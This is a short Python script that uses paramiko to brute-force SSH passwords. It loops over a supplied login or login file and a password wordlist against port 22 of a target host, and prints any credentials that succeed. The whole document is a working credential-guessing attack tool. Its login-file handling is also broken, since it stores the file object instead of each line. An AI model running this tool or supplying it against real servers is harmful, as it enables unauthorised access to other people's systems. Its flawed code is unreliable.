#! /usr/bin/python

import paramiko
from argparse import ArgumentParser
from os.path import isfile

parser = ArgumentParser()
parser.add_argument('-H', '--host', dest='host', help='The host.', required=True, nargs=1)
parser.add_argument('-l', '--login', dest='login', help='the login', required=True, nargs=1)
parser.add_argument('-w', '--wordlist', dest='wordlist', help='The wordlist.', nargs=1, required=True)

args = parser.parse_args()
login = args.login[0]

logins = set()
if isfile(login):
    with open(login) as l:
        for i in l:
            logins.add(l)
else:
    logins.add(login)

host = args.host[0]
port = 22

print("Beginn cracking...")

if args.wordlist is None:
    exit(0)

pwds = set()
with open(args.wordlist[0]) as word:
    for w in word:
        pwds.add(w.strip("\n"))

for login in logins:
    for word in pwds:
        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy)
            ssh.connect(host, 22, login, word)
        except paramiko.AuthenticationException:
            ssh.close()
            continue
        except KeyboardInterrupt:
            exit(-1)

        print("Password found. User: " + login + ' Password: ' + word)
        break

